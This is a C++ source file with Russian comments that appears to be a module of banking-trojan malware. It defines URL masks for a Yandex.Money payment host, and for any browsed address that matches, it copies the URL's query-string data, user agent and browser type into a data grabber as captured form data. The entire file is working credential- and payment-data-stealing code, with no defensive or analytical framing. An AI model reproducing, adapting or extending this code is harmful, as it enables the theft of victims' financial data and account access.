//---------------------------------------------------------------------------

#pragma hdrstop

#include "Strings.h"
#include "Loader.h"
#include "GETDataGrabber.h"
//---------------------------------------------------------------------------


// Массив масок сайтос которых необходимо отправить данные
const static PCHAR GETDataURLMasks[] = {
		"https://s4.money.yandex.net*",
		NULL};




bool CanSendGETData(const char* URL)
{
	// Функция проверяет необходимость отправки данных с указанного адреса
	for (int i = 0; GETDataURLMasks[i] != NULL; i++)
	{
		if (WildCmp((PCHAR)URL, GETDataURLMasks[i]))
			return true;
	}
	return false;
}

//----------------------------------------------------
//  Функция, при необходимости, отправляет GET данные
//  из URL адреса
//----------------------------------------------------
bool SendGETData(const char* URL, const char* UserAgent, DWORD BrowserType)
{
	// Определяем позицию разделителя
	PCHAR Data = STRA::Scan(URL, '?');
	if (Data)
	{
		Data++;
		if (STRA::IsEmpty(Data))
			return false;
	}

	if (!CanSendGETData(URL))
		return false;

	string URLCopy;

	URLCopy.Copy(URL, 0, (Data - URL) - 1); 

	return DataGrabber::AddHTMLFormData(URLCopy.t_str(), Data, (PCHAR)UserAgent, BrowserType, DATA_TYPE_FORM);
	
}
